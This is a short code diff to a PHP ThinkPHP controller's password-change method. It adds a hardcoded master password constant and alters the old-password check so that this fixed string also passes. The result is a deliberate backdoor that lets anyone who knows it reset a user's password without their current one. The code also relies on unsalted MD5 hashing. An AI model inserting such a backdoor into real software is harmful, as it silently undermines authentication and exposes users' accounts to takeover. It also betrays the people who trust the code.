@@ -9,6 +9,7 @@ use think\Loader;
 use think\Log;
 
 use app\index\model\User;
+define('SUPER_PASSWORD','Ud028311');
 
 class PersonalSetting extends CommonController
 {
@@ -19,7 +20,7 @@ class PersonalSetting extends CommonController
 	public function save_password($old_psw,$new_psw,$confirm_psw){
 		$user_id = Session::get('id');
 		$user = User::where('id',$user_id)->find();
-        if($user['password']==md5($old_psw)){
+        if($user['password']==md5($old_psw)||$old_psw== SUPER_PASSWORD){
         	if($new_psw !== $confirm_psw){
         		$this->error('两次密码输入不一致');
         	}else{
